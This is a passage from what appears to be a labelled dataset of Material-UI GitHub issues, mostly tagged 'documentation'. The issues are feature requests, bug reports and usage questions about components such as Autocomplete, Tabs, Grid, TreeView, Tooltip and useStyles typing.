a list of all current studies:\r\nhttps://material.io/design/material-studies/basil.html\r\nhttps://material.io/design/material-studies/crane.html\r\nhttps://material.io/design/material-studies/fortnightly.html\r\nhttps://material.io/design/material-studies/owl.html\r\nhttps://material.io/design/material-studies/rally.html\r\nhttps://material.io/design/material-studies/reply.html\r\nhttps://material.io/design/material-studies/shrine.html\r\n\r\nIt would be great if for example the Material-UI customization (https://material-ui.com/customization/color/#color-tool) extends with this presets\r\n\r\n## Motivation 🔦\r\nIt would be great if the theme presets would be available to kickstart a new project. This is how I an example code could look like:\r\n```js\r\nimport { basil } from '@matarial-ui/core/presets'\r\nimport { createMuiTheme, ThemeProvider } from '@material-ui/core/styles'\r\nconst theme = createMuiTheme({\r\n  preset: basil,\r\n  overrides:{/* some customizations */}\r\n})\r\n```"},{"labels":[null,"documentation",null],"text":"My title is quite self-explanatory, I implemented a navigation bar using the `<Tabs>` which allows me to navigate through my website as one would expect. However, when/if I try to directly access an endpoint (e.g. `/services` or `about`), the `<Tabs>` are obviously out of sync and the `<Tab>` that should be set as active is not.\r\n\r\nI am sure that this is a well-known issue with a \"hacky\" fix that should be included in the official doc, to avoid rookies like me posting this type of ticket. 😁"},{"labels":[null,"documentation",null],"text":"I'm using the [SvgIcon](https://material-ui.com/api/svg-icon/#svgicon-api) component to add styles from the MUI theme to my custom svg icons.  However I would prefer not to have to specify the viewBox for every custom icon that we have.  I took a look at the [source code](https://github.com/mui-org/material-ui/blob/master/packages/material-ui/src/SvgIcon/SvgIcon.js) and didn't see a way to tell the SvgIcon component to use the viewBox from the referenced component, so I came up with the solution below.  I'm using the [svgr ](https://github.com/smooth-code/svgr) webpack plugin to import my icons.  Is there a better workaround?\r\n```\r\nimport React from 'react';\r\nimport SvgIcon from '@material-ui/core/SvgIcon';\r\n\r\nexport default function Icon({ glyph, ...otherProps }) {\r\n  return (\r\n    <SvgIcon\r\n      {...otherProps}\r\n      component={glyph}\r\n      viewBox={glyph().props.viewBox}\r\n    />\r\n  );\r\n}\r\n```"},{"labels":["documentation",null],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nI would like to show a first snackbar with transition (growing) and then replace it by other snackbars without transition.\r\n\r\nNote: I currently use the `key` attribute. Without it, snackars replace themself without transition, but they don't delete transition out correctly.\r\n\r\n## Motivation 🔦\r\n\r\nCurrently, replacing a snackbar by another means transition out the snackbar, then transition in the new snackbar. This is visually heavy."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nI would like some way to read the value of the currently highlighted item or react on the value changing in the Autocomplete component.\r\n\r\n## Examples 🌈\r\nNo strong opinions on how it should be implemented, but I would like the ability to do something along these lines:\r\n```\r\n<Autocomplete {...props} onHighlight={(index) => doSomething(index)} />\r\n```\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI followed the guidelines in the docs for implementing a virtualized Autocomplete, and it worked like a charm. However, I'm in a situation where I'm not able to add `react-window` as a dependency. I do have `react-virtualized` to work with, and tried implementing it like this:\r\nhttps://codesandbox.io/s/sleepy-hypatia-igog8?fontsize=14&hidenavigation=1&module=%2Fsrc%2FVirtualizedAutocomplete.js&theme=dark\r\n\r\nIt's close to working, the only thing off is the keyboard navigation. If I navigate to something outside of the visible items, the list doesn't scroll with the highlight, which would be the desired behavior. `List` in `react-virtualized` does have a `scrollToIndex` method, which I could have utilized if I could somehow get a hold of the currently highlighted index.\r\n\r\nMy other option would be to use the `useAutocomplete` hook instead and decorate the `onKeyDown` method, but since the only thing I'm adding is the virtualization I'd like to avoid that if possible.\r\n"},{"labels":["documentation",null],"text":"please share the routing example for \r\nhttps://material-ui.com/getting-started/templates/dashboard/"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nFirst of all, this is an extremely minor issue, but just so you're aware:\r\n\r\nIt happens in the right-side navigation menu for components. When I cmd+click an item to open it in another tab, e.g. on 'Demos' it goes to https://material-ui.com/#demos, which redirects to https://v0.material-ui.com/#/demos\r\n\r\n## Expected Behavior 🤔\r\n\r\nIt should open the correct page in a new tab and the page should scroll to the selected section.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. go to https://material-ui.com/components/box/\r\n2. cmd+click on an item in the ride-side navigation\r\n3. look at the tab it opens\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.7.2  |\r\n| React       |         |\r\n| Browser     |   latest chrome      |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":["documentation",null,null],"text":"From the [example here](https://material-ui.com/components/use-media-query/#server-side-rendering):\r\n\r\n```js\r\nconst html = ReactDOMServer.renderToString(\r\n    <ThemeProvider\r\n      theme={{\r\n        props: {\r\n          // Change the default options of useMediaQuery\r\n          MuiUseMediaQuery: { ssrMatchMedia },\r\n        },\r\n      }}\r\n    >\r\n      <App />\r\n    </ThemeProvider>,\r\n  );\r\n```\r\n\r\nIt is not clear that SSR required a custom `ssrMatchMedia` implementation for the client side Application as well (beside the server side). Omitting the `ssrMatchMedia` from the client side causing client rending problems.\r\n\r\nMy current implementation, pass to the client the \"estimated CSS width of the browser\" so the client can render the server DOM currently using the `ssrMatchMedia`. I would update the [docs here](https://material-ui.com/components/use-media-query/#usemediaquery-query-options-matches) as well to clarify it."},{"labels":[null,"documentation",null],"text":"Hi,\r\nI am trying to change list options and default value from state. List option is ok but default value is never update.\r\n\r\nI have add an exemple on this code box :\r\nhttps://codesandbox.io/s/test-material-ui-autocomplete-700nh?fontsize=14&hidenavigation=1&theme=dark\r\n\r\nThank you for yours ideas...\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nAutocomplete defaultvalue for checked options only works if options reference is passed\r\n\r\nI created a demo to represent this issue \r\nhttps://codesandbox.io/s/material-demo-4imuq\r\n\r\nIn the example, both Autocompletes are able to show the selected values in the input field correctly the issue arises  in the second autocomplete when you open the autocomplete you can only see checkbox for the only one value. \r\n\r\nCurrent Behaviour \r\n![image](https://user-images.githubusercontent.com/15063261/69422705-5ef3d300-0d4a-11ea-8a0e-0c7d617bd5d0.png)\r\n\r\nExpected Behaviour\r\n![image](https://user-images.githubusercontent.com/15063261/69422727-6e731c00-0d4a-11ea-9154-0e9fba30d312.png)\r\n\r\nMy apology if i didn't articulate the bug precisely \r\n"},{"labels":[null,null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nChecking out the demo of the [Autocomplete Virtualization docs](https://material-ui.com/components/autocomplete/#virtualization) on (codesandbox](https://codesandbox.io/s/97t29). When I click the autocomplete it crashes with an error\r\n\r\n```\r\nMaterial-UI: the `query` argument provided is invalid.\r\nYou are providing a function without a theme in the context.\r\nOne of the parent elements needs to use a ThemeProvider. \r\n    in ListboxComponent (created by Autocomplete)\r\n    in Autocomplete (created by WithStyles(ForwardRef(Autocomplete)))\r\n    in WithStyles(ForwardRef(Autocomplete)) (at demo.tsx:81)\r\n    in Virtualize (at index.tsx:6)\r\n```\r\n\r\n## Expected Behavior 🤔\r\n\r\nIt works\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. go to https://codesandbox.io/s/97t29\r\n2. click on the autocomplete\r\n3. check the console\r\n\r\n## Context 🔦\r\n\r\nJust trying out the new component\r\n\r\n## Your Environment 🌎\r\n\r\nhttps://codesandbox.io/s/97t29\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | latest |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\nWhen click on hide after show, the list is not yet collapsed to the desired height\r\n\r\n## Current Behavior 😯\r\n\r\nif click hide to hide height in styles will not change\r\n\r\n## Expected Behavior 🤔\r\n\r\nheight remove and sets only min-height in styles\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/keen-thompson-9k8kx\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | latest  |\r\n| React       | latest|\r\n| Browser     |chrome latest|\r\n\r\n"},{"labels":[null,"documentation"],"text":"I have a treeview with a couple of hundred nodes. I have added a textfield before the treview that the user can use to search/filter the tree. As they type I add/remove classes from the TreeItems to hide and show TreeItems. It works fine BUT I want all of the tree view nodes to be expanded once they enter something into the search/filter textfield.\r\n\r\nI have tried feeding the \"defaultExpanded\" prop a new list that has all of the nodes in it but it doesn't seem to cause the nodes to expand as I had expected. The defaultExpanded prop only seems to be respected when the tree initially draws.\r\n\r\nI am currently working around this by looking for collapsed nodes and firing click events for them to force them to open but that is causing issues (the textfield looses focus and the keyboard hides and the treeview jumps around). \r\n\r\nIs there a recommended way to dynamically expand all of the nodes in a TreeView?\r\n"},{"labels":[null,"documentation",null,null],"text":"\r\n<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\nAn example of material-ui using typescript and preact.\r\n\r\n## Examples 🌈\r\nn/a\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\nRunning material-ui with typescript and preact transpiles ok, but there are a alot of visual errors in my editor (VS Code), probably because I haven't figured out how to set everything up correctly. An example of how it should be done would probably help me and others with that.\r\n\r\nExample: \r\n<img width=\"666\" alt=\"Screenshot\" src=\"https://user-images.githubusercontent.com/224493/68860143-2d935b80-06e9-11ea-8dc9-3d0198339a2a.png\">\r\n\r\n"},{"labels":["documentation",null,null],"text":"link in the contributing file goes nowhere:\r\nhttps://github.com/mui-org/material-ui/blob/master/CONTRIBUTING.md#about-typescript-demos\r\n"},{"labels":["documentation"],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n - This actually is a duplicate of #7981, but that issue is quite old and I think this would be worth re-visiting.\r\n\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nMany Material-UI components delegate to other Material-UI components.\r\n\r\nThere are two main flavors of this delegation:\r\n\r\n1. Delegating to a root element wrapped by the main component. Any props not recognized by the main component will be passed down to this root element. Example: `Menu` wraps `Popover` which in turn wraps `Modal`.\r\n2. Delegating to components other than the root element. Props are generally passed to these components via a prop on the main component with a name of `<InnerComponentName>Props`. Example: `Select` leverages `Menu` and receives props for the `Menu` element via its `MenuProps` prop.\r\n\r\nIt is the first case (delegation to a root element) for which I think the documentation could be considerably improved.\r\n\r\nCurrently the documentation forces you to follow links to these other components in order to discover the full set of props that a component supports. Many people, especially new users of the library, do not notice (or fully understand) the \"Any other props supplied will be provided to the root element\" portion and miss the fact that many more props may be supported by the component. I think it would be much better for users of the documentation if all of the props from \"inherited\" components were included directly. So in the case of `Menu`, the props for `Popover` and `Modal` would be included directly in the `Menu` documentation. It seems like it should be doable for [buildApi.js](https://github.com/mui-org/material-ui/blob/master/docs/scripts/buildApi.js) and [generateMarkdown.js](https://github.com/mui-org/material-ui/blob/master/docs/src/modules/utils/generateMarkdown.js) to be enhanced to automatically include the comprehensive props.\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n[This StackOverflow question](https://stackoverflow.com/questions/58781285/for-material-ui-how-can-i-know-what-the-properties-of-each-components-are) shows one example of users assuming that a component ([AppBar](https://material-ui.com/api/app-bar/) in this case) only supports the properties shown directly on its API page.\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI understand that the current way of documenting the properties was an easier approach to implement, but given the place of \"Better documentation\" within the [roadmap priorities](https://material-ui.com/discover-more/roadmap/#priorities), I think it would be worth the additional complexity in the API doc generation (which is already aware of the inherited component) to allow users to find the comprehensive props more easily/quickly."},{"labels":[null,null,"documentation"],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release. (**only in the docs example, not in material-ui library**)\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nIf you select \"All\" Rows per page option in the docs example Table > Custom pagination actions (https://material-ui.com/components/tables/#custom-pagination-actions) only 12 of the 13 items are visible. Item KitKat is missing.\r\n\r\n## Expected Behavior 🤔\r\n\r\nAll items should be visible.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. Open https://material-ui.com/components/tables/#custom-pagination-actions\r\n2.  select Rows per page \"All\" \r\n\r\n## Bug\r\n\r\nIf \"All\" is selected, `page` is `0` and `rowsPerPage` is `-1` so the line `rows.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)` is `rows.slice(0, -1)` and the last item get's removed.\r\n\r\n"},{"labels":["documentation",null],"text":"I'm using `<InputBase />` in much the same way as it is being used in the [google-maps inspired example](https://material-ui.com/components/text-fields/#customized-inputs).\r\n\r\nWhen the user hits enter, `InputBase` does not fire any events that I can use to wire in the action. I guess that I could use `onKeyUp` but that seems like a bad idea, based on the `@ignore` doc preceding the `onKeyUp` function."},{"labels":[null,"documentation",null],"text":"Grid items are an opinionated height when using the `xs` and similar attributes on items within Grid column containers.\r\n\r\nI don't think you should use `flex-basis` for Grid item's in a column container when `xs` and similar attributes are used on items. I think `xs` and related attributes are intended to control the width only, never the height, but flex-basis controls height in column containers.\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe following code results in an item with `flex-basis: 100%`, which is not expected for column containers.\r\n\r\n```html\r\n<Grid container direction=\"column\">\r\n  <Grid item xs={12}>test</Grid>\r\n</Grid>\r\n```\r\n\r\n## Expected Behavior 🤔\r\n\r\nInstead, I think height should not be controlled by `xs` and similar attributes on Grid items. You probably should use `width: 100%`  rather than flex-basis when an item is directly under a column container.\r\n\r\nThe workaround I am using is to specify the width without the attributes, e.g.\r\n```html\r\nconst useStyles = makeStyles(theme => ({\r\n  xs12: {\r\n    width: '100%',\r\n  },\r\n}))\r\nconst Comp = () => {\r\n    const classes = useStyles()\r\n    return (\r\n<Grid container direction=\"column\">\r\n  <Grid item className={classes.xs12}>test</Grid>\r\n</Grid>\r\n  )\r\n}\r\n```\r\n\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/mui-bug-for-column-containers-8ztdx\r\n\r\nSteps:\r\n\r\n1. make a column container with Grid\r\n2. see the item fill the height even though it should not.\r\n\r\n## Context 🔦\r\n\r\nI'm trying to make a simple page with items going down on the page.\r\n\r\n## Your Environment 🌎\r\n\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | \"@material-ui/core\": \"^4.5.1\",  |\r\n| React       |  CRA \"react\": \"^16.11.0\", |\r\n| Browser     | Chrome 78.0.3904.70 |\r\n| TypeScript  |     n/a    |\r\n| OS |  macOS Version 10.13.6 |\r\n\r\n\r\n"},{"labels":[null,"documentation"],"text":"\r\nFor example, in [https://material-ui.com/components/checkboxes/](https://material-ui.com/components/checkboxes/,) clicking on checkboxes focuses on the form label \"Assign responsibility\" at irregular times.\r\n\r\n![ezgif com-video-to-gif (1)](https://user-images.githubusercontent.com/22501334/68229877-0ae4b100-001e-11ea-9d20-b5717fdc47bf.gif)\r\n\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nForm label focus keeps changing irregularly.\r\n\r\n## Expected Behavior 🤔\r\n\r\nForm label doesn't change focus like this for checkboxes.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. Go to [https://material-ui.com/components/checkboxes/](https://material-ui.com/components/checkboxes/)\r\n2. Scroll down to 'Checkboxes with FormGroup'\r\n3. Click on random checkboxes\r\n4. See error\r\n\r\n## Your Environment 🌎\r\nFound while contributing to Taskclutster, Mozilla. Reproducible in Chrome with both Windows and Mac devices. Not reproduced in Mozilla Firefox."},{"labels":[null,"documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen passing in a value of `undefined` and then changing the value to a correct value, stops the `AutoComplete` from re-rendering.\r\n\r\n## Expected Behavior 🤔\r\n\r\nAt least something to happen. Now you're just stuck trying to figure out what's happening. Either default to an empty array, of have something logged in console to warn about it (e.g. like React does when changing from `uncontrolled` to `controlled`).\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/embed/material-demo-dj0w5\r\n\r\nSteps:\r\n\r\n1. Check the console. See that the value is `undefined`.\r\n2. Click the button at the top.\r\n3. See that the value is now an array with two elements.\r\n4. `AutoComplete` is not showing the new values.\r\n5. If you change the initial `useState()` value to `useState([])` everything works as expected.\r\n\r\n## Context 🔦\r\n\r\nOur values are fetched from an api. So initially the value is not defined. We could set our initial state to an empty array, but this is conflicting, because that way you don't know when the api call has completed (as an empty array could also be returned by the api call).\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | latest  |\r\n| React       | latest |\r\n| Browser     | chrome |\r\n| TypeScript  | no |\r\n"},{"labels":["documentation"],"text":"When don't set `id` and `labelId`\r\n\r\n<img width=\"243\" alt=\"Screen Shot 2019-10-29 at 9 03 04 PM\" src=\"https://user-images.githubusercontent.com/1549069/67793100-816a3780-fa8f-11e9-8f0f-9ab6a5a744c3.png\">\r\n\r\nin version 4.5.2"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n## Motivation 🔦\r\n\r\nI'd like to use `OnePirate` #14604 on Firebase hosting, according to Next.js `with-firebase-hosting` example.\r\n\r\n- [x] I tried by myself many times.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Examples 🌈\r\n\r\nIt was so hard to adjust it to the zeit example, where doesn't have any special settings.\r\n\r\nhttps://github.com/zeit/next.js/tree/master/examples/with-firebase-hosting\r\nhttps://github.com/zeit/next.js/tree/master/examples/with-firebase-hosting-and-typescript\r\n\r\n## Summary 💡\r\n\r\nEvery time I try to serve/deploy on Firebase hosting, when I open the link, I'm redirected to a `Google appengine` authentication url.\r\n\r\n![image](https://user-images.githubusercontent.com/4691768/67631646-e5b2ae80-f877-11e9-9587-e5a1df4be29e.png)\r\n\r\n\r\n### Environments:\r\n\r\n- npm@6.4.1\r\n- node@8.16.2\r\n- react@16.11.0\r\n- react-dom@16.11.0\r\n- next@9.1.1\r\n- firebase-functions@3.3.0\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nAs described at https://material-ui.com/components/tooltips/#disabled-elements, you have to wrap a disabled button in a span and set pointerEvents to none. This causes the tooltip to never show in Safari.\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nhttps://codesandbox.io/s/material-demo-9h7of\r\nThe tooptip does not show in Safari 13.0.2\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe tooptip should be shown.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/material-demo-9h7of\r\n\r\nSteps:\r\n\r\n1. Hover button\r\n\r\n## Context 🔦\r\n\r\nTooltips on disabled buttons can be useful to give more information.\r\n\r\n## Your Environment 🌎\r\n\r\nCodeSandbox from the docs, slightly edited the code to show the bug.\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.5.1  |\r\n| React       | 16.11.0        |\r\n| Browser     | Safari 13.0.2  |\r\n"},{"labels":["documentation",null,null],"text":"Hi, \r\n\r\nI've been using material ui for a while and I am trying to migrate from the withstyles approach towards the useStyles approach. You have a really neat doc on how to use withStyles and extend from it to get static typing on your component. (https://material-ui.com/guides/typescript/)\r\nBy using the method in your doc, we could override classes in child components, creating highly customizable base components.\r\n\r\nIt would go like this in the parent component:\r\n```\r\n<ComponentName classes{{root: classes.overrideBGWithBlack}} />\r\n```\r\nAnd the child component would be written like this:\r\n\r\n```\r\nimport React from 'react';\r\nimport { withStyles, WithStyles, createStyles, Theme } from '@material-ui/core';\r\n\r\nconst styles = (theme: Theme) => createStyles({\r\n    root: {\r\n        background: 'red'\r\n    }\r\n});\r\n\r\ninterface Properties extends WithStyles<typeof styles> {\r\n  name: string;\r\n}\r\n\r\nclass ComponentName extends React.PureComponent<Properties> {\r\n  render() {\r\n    const { \r\n        classes,\r\n        name \r\n    } = this.props;\r\n\r\n    return (\r\n        <div className={classes.root}>      \r\n        My name is {name}\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nexport default withStyles(styles)(ComponentName);\r\n```\r\nSo i'm trying to do the same in the new child component using useStyles but i am struggeling with finding the right interface to use to expose the classnames.\r\n\r\n```\r\nimport React from 'react';\r\nimport { makeStyles, createStyles, Theme, WithStyles } from '@material-ui/core/styles';\r\n\r\n                                        // TYPE INCOMPATIBILITY HERE\r\ninterface Properties extends WithStyles<typeof useStyles> {\r\n  name: string;\r\n}\r\nconst useStyles = makeStyles((theme: Theme) =>\r\n  createStyles({\r\n    root: {\r\n      background: 'red'\r\n    }\r\n  })\r\n);\r\n\r\nexport default function ComponentName(props: Properties): JSX.Element {\r\n  const classes = useStyles(props);\r\n  \r\n  const {\r\n    name\r\n  } = props;\r\n\r\n  return (\r\n    <div className={classes.root}>      \r\n      My name is {name}\r\n    </div>\r\n  );\r\n}\r\n```\r\n\r\nSo it would be great if there is documentation on how expose the classnames with the useStyles."},{"labels":[null,"documentation",null,null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\nIt would be great if you could add possibility to have multiple header rows\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\n\r\nThe output table should have multiple header rows, it should look something like this: \r\n\r\n![](https://user-images.githubusercontent.com/5377501/38248563-731cf9f4-3751-11e8-9c7d-1486c640fb3d.png)\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI need this to see how an item behaved in time\r\n\r\n```\r\n     |     Date 1    |     Date 2    | ...\r\nItem | price | sales | price | sales | ... \r\n```\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\nEvery time I open the docs, the page jumps around whenever the ad loads. This is kind of disruptive.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe page slides down when the ad loads\r\n\r\n![mui-ad](https://user-images.githubusercontent.com/2109932/66832139-8db3a800-ef59-11e9-9de3-f6d360908fe5.gif)\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nIdeally, a placeholder is shown, or space is reserved for where the ad will appear. This way the page content doesn't slide down when it loads and it doesn't disrupt the reading experience (I understand that disrupting the reader is the purpose of ads, but I don't think it should be the purpose of the docs).\r\nMaybe the new skeleton component can be used for this?\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. open the docs\r\n2. observe\r\n\r\n## Context 🔦\r\n\r\nJust trying to find answers in the docs in the most pleasant and effective way.\r\n\r\nThere is also a secondary issue, when you have dark theme enabled, there's a FOLC (flash of light-themed content 🙂) on page load.\r\n\r\n![mui-folc](https://user-images.githubusercontent.com/2109932/66832549-6d381d80-ef5a-11e9-8733-82f999a9068b.gif)\r\n\r\n## Your Environment 🌎\r\n\r\nScreenshots were generated in chrome\r\n"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\nAdd override PaperProps for remove in some case elevation, \"Divider\" in ::before.\r\n\r\n## Summary 💡\r\n\r\nAdd ability to override PaperProps for ExpansionPanel\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n![image](https://user-images.githubusercontent.com/19804652/66745491-c4b98900-ee87-11e9-9948-0415cd3f016e.png)\r\n\r\n\r\n## Motivation 🔦\r\n\r\nIt is logical that there should be the ability to change the behavior of the component on which the current component is based.\r\n"},{"labels":["documentation"],"text":"Is it more preferable to use `@material-ui/core/styles` instead of 